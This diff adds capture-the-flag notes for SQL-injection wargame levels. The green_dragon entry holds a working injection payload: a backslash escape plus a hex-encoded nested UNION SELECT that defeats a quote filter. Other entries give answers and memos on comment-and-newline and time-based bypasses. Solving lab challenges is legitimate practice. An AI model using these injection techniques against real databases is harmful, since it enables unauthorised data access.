@@ -162,8 +162,32 @@ solve : ?pw=admin_secure_email@emai1.com
 
 green_dragon
 
-prob : 
+prob : select id,pw from prob_green_dragon where id='' and pw=''
 
-solve : 
+solve : ?id=\&pw = union select 0x5c,(select 0x756e696f6e2073656c6563742030783631363436643639366523)%23
 
-memo : id=/&pw=union select 0x5c, (select 0x756e696f6e2073656c6563742030783631363436643639366523)
+memo : query1=select id,pw from prob_green_dragon where id='\' and pw='union select 1,2#'
+       query2=select id from prob_green_dragon where id='1' and pw='2',
+       쿼터 필터링, 
+       query1 : id=\&pw = union select 0x5c,(select 0x756e696f6e2073656c6563742030783631363436643639366523)%23 
+       query2 : id = \ , pw = union select 0x61646d696e#
+       0x5c
+       0x756e696f6e2073656c6563742030783631363436643639366523   
+
+
+red_dragon(노가다)
+
+prob : select id from prob_red_dragon where id='' and no=1
+
+solve : 586482014
+
+memo : id는 7자리까지, no는 is_numeric함수 사용, #과 개행문자로 우회
+
+
+blue_dragon(timed based)
+
+prob : select id from prob_blue_dragon where id='' and pw=''
+
+solve : d948b8a0
+
+
